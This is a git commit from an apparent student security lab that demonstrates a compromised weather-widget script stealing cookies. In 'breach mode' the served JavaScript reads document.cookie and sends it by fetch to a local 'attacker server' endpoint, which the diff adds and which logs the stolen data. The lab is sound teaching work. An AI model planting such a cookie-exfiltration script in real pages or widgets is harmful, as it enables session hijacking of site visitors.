f1663bd49bc763cce19e9b89462a38bb6e81f82b
dimastrakhov <22fmif.d.strahov@std.npu.edu.ua>
2026-03-25 16:26:34 +0000

    Lab 4 (Task 2): Demonstrated XSS-to-Cookie theft

--- utility-5000/server.js
+++ utility-5000/server.js
@@ -9,13 +9,19 @@ app.get('/weather.js', (req, res) => {
     
     if (isBreachMode) {
         res.send(`
-            alert("HACKED: I can see your cookies: " + document.cookie + " and User: " + document.getElementById('username').innerText);
+            const stolenCookie = document.cookie;
+        
+            fetch('http://localhost:5001/log?data=' + encodeURIComponent(stolenCookie), { mode: 'no-cors' });
+            console.log("Cookie successfully sent to Attacker Server!");
         `);
     } else {
-        res.send(`
-            console.log("Віджет погоди: 22°C, Сонячно");
-        `);
+        res.send('console.log("Віджет погоди: 22°C, Сонячно");');
     }
+});
+
+app.get('/log', (req, res) => {
+    console.log("🚨 ХАКЕРСЬКИЙ СЕРВЕР ОТРИМАВ ДАНІ:", req.query.data);
+    res.send("Дані отримано");
 });
 
 app.listen(port, () => {
